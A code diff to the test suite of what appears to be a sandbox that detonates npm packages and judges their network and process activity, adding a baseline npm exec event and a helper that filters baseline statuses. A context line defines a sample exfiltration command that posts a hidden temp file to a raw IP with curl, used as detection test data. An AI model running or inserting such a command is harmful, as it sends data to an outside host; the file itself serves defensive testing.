@@ -20,6 +20,7 @@ from brain.report import render
 from brain.rules import evaluate
 from brain.verdict import combine
 from shared.contract import ConnectEvent, DetonateResult, ExecEvent
+from tests.conftest import NPM_EXEC
 
 FIXTURES = Path(__file__).parent / "fixtures"
 PAYLOAD = "curl -s -X POST --data-binary @/tmp/.e http://203.0.113.10/collect"
@@ -58,8 +59,10 @@ def exec_(binary, args="") -> ExecEvent:
 
 
 def result(connects=(), execs=()) -> DetonateResult:
+    # NPM_EXEC baseline: a completed run with no exec events is treated as a blind sensor.
     return DetonateResult(
-        job_id="j", status="completed", exit_code=0, duration_s=1, exec_events=list(execs),
+        job_id="j", status="completed", exit_code=0, duration_s=1,
+        exec_events=[NPM_EXEC, *execs],
         connect_events=list(connects), dns_queries=[], stdout_tail="", stderr_tail="",
     )  # fmt: skip
 
@@ -130,24 +133,30 @@ def test_e4_contract_flags_raw_ip_and_curl_unexplained():
     assert statuses["registry.npmjs.org:443"] == "baseline" and statuses["node"] == "baseline"
 
 
+def judged(contract) -> list[str]:
+    """Contract statuses excluding `baseline`, which is known tooling (npm itself) rather
+    than something the prediction is answerable for."""
+    return [i.status for i in contract.items if i.status != "baseline"]
+
+
 def test_raw_ip_can_never_be_explained():
     contract = evaluate_contract(
         outcome(domains=["203.0.113.10"]), result([connect("203.0.113.10")])
     )
-    assert [i.status for i in contract.items] == ["unexplained"]
+    assert judged(contract) == ["unexplained"]
 
 
 def test_predicted_cdn_is_explained():
     res = result([connect("142.250.1.1", domain="binaries.prisma.sh")])
     contract = evaluate_contract(outcome(domains=["binaries.prisma.sh"]), res)
-    assert [i.status for i in contract.items] == ["explained"]
+    assert judged(contract) == ["explained"]
 
 
 def test_predicted_binary_is_explained():
     contract = evaluate_contract(
         outcome(binaries=["/usr/bin/unzip"]), result(execs=[exec_("/usr/bin/unzip")])
     )
-    assert [i.status for i in contract.items] == ["explained"]
+    assert judged(contract) == ["explained"]
 
 
 def test_no_prediction_means_empty_contract():
